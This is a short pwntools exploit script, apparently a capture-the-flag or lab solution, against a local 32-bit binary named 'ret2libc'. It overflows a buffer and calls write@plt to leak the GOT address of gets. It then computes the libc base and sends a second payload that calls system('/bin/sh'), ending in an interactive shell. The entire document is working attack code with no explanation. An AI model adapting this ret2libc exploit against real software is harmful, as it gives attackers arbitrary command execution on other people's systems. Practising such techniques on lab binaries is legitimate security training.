from pwn import *
context.log_level = "debug"
p = process("./ret2libc")
e = ELF("./ret2libc")
w_plt = e.plt["write"]
gets_got = e.got["gets"]

vul = e.symbols["vul"]

payload = "A"*22+p32(w_plt)+p32(vul)+p32(1)+p32(gets_got)+p32(4)

p.sendlineafter("hello",payload)

gets = u32(p.recv(4))
libc = ELF("/lib/i386-linux-gnu/libc.so.6")
libc_base = gets - libc.symbols["gets"]
sys = libc_base + libc.symbols["system"]
bin_sh = libc_base + libc.search("/bin/sh").next()

payload2 = "A"*22+p32(sys)+"BBBB"+p32(bin_sh)
p.sendline(payload2)
p.interactive()


